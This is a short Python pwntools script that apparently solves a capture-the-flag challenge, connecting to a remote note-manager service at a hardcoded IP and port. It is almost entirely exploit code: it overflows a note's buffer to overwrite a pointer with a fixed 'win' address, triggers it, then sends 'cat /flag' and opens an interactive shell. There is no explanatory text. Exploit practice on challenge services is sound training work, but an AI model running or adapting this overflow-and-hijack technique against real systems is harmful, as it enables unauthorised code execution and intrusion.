from pwn import *

REMOTE = True
HOST = '3.34.91.236'
PORT = '20008'

if REMOTE:
    io = remote(HOST, PORT)
else:
    io = remote('localhost', 20007)

def make_note(idx, size, name, content):
    io.sendlineafter('> ', '1')
    io.sendlineafter('> ', str(idx))
    io.sendlineafter('> ', str(size))
    io.sendafter('> ', name)
    if size != 0:
        io.sendafter('> ', content)

def delete_note(idx): 
    io.sendlineafter('> ', '2')
    io.sendlineafter('> ', str(idx))

def edit_note(idx, name, content):
    io.sendlineafter('> ', '3')
    io.sendlineafter('> ', str(idx))
    io.sendafter('> ', name)
    io.sendafter('> ', content)

def print_note(idx):
    io.sendlineafter('> ', '4')
    io.sendlineafter('> ', str(idx))

win = 0x4012e9
make_note(0, 0, 'a'*0x10, 'b'*0x10)
edit_note(0, 'a'*0x20, b'b'*0x100+p64(win))
print_note(0)
io.sendline('cat /flag')

io.interactive()